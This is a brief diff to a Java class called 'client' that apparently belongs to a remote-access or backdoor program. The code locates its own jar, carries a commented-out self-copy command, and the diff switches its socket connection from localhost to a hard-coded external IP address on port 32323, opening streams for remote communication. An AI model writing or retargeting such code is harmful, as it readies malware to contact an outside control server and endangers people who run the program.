@@ -26,7 +26,7 @@ public class client {
 				loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
 				loc = loc.substring(1);
 				// Runtime.getRuntime().exec("cmd /c copy " + loc + " o.jar");
-				sock = new Socket("localhost", 32323);
+				sock = new Socket("92.53.66.44", 32323);
 				ps = new PrintStream(sock.getOutputStream());
 				din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
 				is = sock.getInputStream();
